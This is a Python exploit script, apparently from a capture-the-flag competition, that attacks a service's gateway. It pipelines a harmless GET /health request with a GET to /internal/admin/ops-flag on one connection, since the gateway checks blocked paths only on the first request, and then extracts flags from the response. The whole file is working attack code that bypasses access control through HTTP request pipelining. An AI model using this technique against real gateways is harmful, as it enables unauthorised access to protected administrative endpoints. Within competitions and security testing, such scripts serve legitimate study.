#!/usr/bin/env python3
"""Tarot Club — ops-gateway ACL bypass (request smuggling via pipelining).

Gateway checks isBlockedPath only on the FIRST request of a connection.
Pipeline GET /health then GET /internal/admin/ops-flag on the same connection.
Usage: python3 exp_tarot_smuggle.py HOST PORT   (PORT = service_port+90)
"""
import re, socket, sys

FLAG_RE = re.compile(r"GEMASTIK\{[^}\s]{48}\}")

def exploit(host, port, flag_id=None):
    payload = (
        b"GET /health HTTP/1.1\r\nHost: x\r\n\r\n"
        b"GET /internal/admin/ops-flag HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n"
    )
    s = socket.create_connection((host, port), timeout=8)
    s.sendall(payload)
    buf = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            buf += d
            if len(buf) > 262144:
                break
    except socket.timeout:
        pass
    s.close()
    text = buf.decode("latin1")
    return FLAG_RE.findall(text)

if __name__ == "__main__":
    host, port = sys.argv[1], int(sys.argv[2])
    for f in exploit(host, port):
        print(f)
